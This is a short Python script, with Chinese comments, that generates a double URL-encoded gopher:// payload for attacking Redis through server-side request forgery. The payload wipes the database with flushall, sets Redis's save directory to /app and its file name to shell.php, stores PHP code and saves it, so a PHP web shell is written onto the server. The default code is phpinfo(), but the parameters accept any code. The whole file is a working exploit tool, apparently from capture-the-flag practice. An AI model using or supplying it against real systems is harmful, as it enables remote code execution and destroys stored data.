"""
    version：Python 3.6.8
    
    dir：保存的路径
    file：保存的文件名
    code：保存文件中的代码
"""
class GopherForRedis:
    def __init__(self, dir="/app", file="shell.php", code="<?php phpinfo();?>", ip="127.0.0.1", port=6379):
        self.head = "flushall"
        self.dir = f"config set dir {dir}"
        self.file = f"config set dbfilename {file}"
        self.code = f"set qwer {code}"
        self.tail = "save"
        self.command = [self.head, self.dir, self.file, self.code, self.tail]
        self.spiltNum = [0, 3, 3, 2, 0]
        self.payload = ""
        self.ip = ip
        self.port = port
        self.flag = "\r\n"
        self.temp = []
        self.resp_encode()
        self.url_encode()

    def url_encode(self):
        self.temp = ""
        for char in self.payload:
            self.temp += f"%{ord(char):02X}"
        self.temp = f"gopher://{self.ip}:{self.port}/_{self.temp}"
        print(f"* * *  第一次url编码  * * *\n{self.temp}")
        self.payload = ""
        for char in self.temp:
            self.payload += f"%{ord(char):02X}"
        print(f"* * *  第二次url编码  * * *\n{self.payload}")

    def resp_encode(self):
        for arg in self.command:
            self.str_spilt(arg, self.spiltNum[self.command.index(arg)])
            self.payload += f"*{len(self.temp)}{self.flag}"
            if len(self.temp) == 1:
                self.payload += f"${len(self.temp[0])}{self.flag}{self.temp[0]}{self.flag}"
            else:
                for param in self.temp:
                    self.payload += f"${len(param)}{self.flag}{param}{self.flag}"
        # print(self.payload)
        
    def str_spilt(self, args, num):
        self.temp.clear()
        if num:
            self.temp = args.split(" ", maxsplit=num)
        else:
            self.temp.append(args)


if __name__ == '__main__':
    GopherForRedis()
